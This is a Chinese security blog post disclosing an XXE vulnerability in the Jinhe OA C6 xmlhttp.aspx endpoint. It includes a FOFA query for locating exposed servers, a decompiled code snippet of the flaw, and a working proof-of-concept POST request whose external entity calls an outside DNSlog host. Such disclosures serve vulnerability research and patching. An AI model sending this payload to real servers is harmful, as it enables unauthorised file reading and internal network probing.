---
title: "金和OA JHSoft.Web.H5SiteControl/xmlhttp.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-H5SiteControl-xmlhttp-xxe.html
asset_dir: assets/金和oa-jhsoft.web.h5sitecontrolxmlhttp.aspx-xxe漏洞
---

# 金和OA JHSoft.Web.H5SiteControl/xmlhttp.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/1/30 13:31
* 184浏览
* [0评论](#comment)
* 8分钟阅读

深入探索

企业安全咨询

Docker加速服务

SQL注入检测工具


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `JHSoft.Web.H5SiteControl/xmlhttp.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞扫描服务

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

深入探索

编程语言教程

安全工具开发

安全

直接根据 `JHSoft.Web.H5SiteControl/xmlhttp.aspx` 在 `bin` 目录下查找 `JHSoft.Web.Groups.dll` 将其进行反编译后找到 **xmlhttp** 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  XmlDocument xmlDocument = new XmlDocument();
  xmlDocument.Load(this.Request.InputStream);
```

请求内容直接使 `XmlDocument.Load` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

```
POST /c6/JHSoft.Web.H5SiteControl/xmlhttp.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到请求

[![金和OA JHSoft.Web.H5SiteControl/xmlhttp.aspx XXE漏洞](images/img-001-ab40f77f1ff8.webp)](https://image.mrxn.net/b12efeef8c1a4140adbccbbbda98c37e.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#XXE](https://mrxn.net/tag/XXE)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[金和OA JHSoft.Web.H5SiteControl/xmlhttp.aspx XXE漏洞](https://mrxn.net/jswz/jhsoft-H5SiteControl-xmlhttp-xxe.html)  
文章链接：<https://mrxn.net/jswz/jhsoft-H5SiteControl-xmlhttp-xxe.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

安全运维咨询

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-H5SiteControl-xmlhttp-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


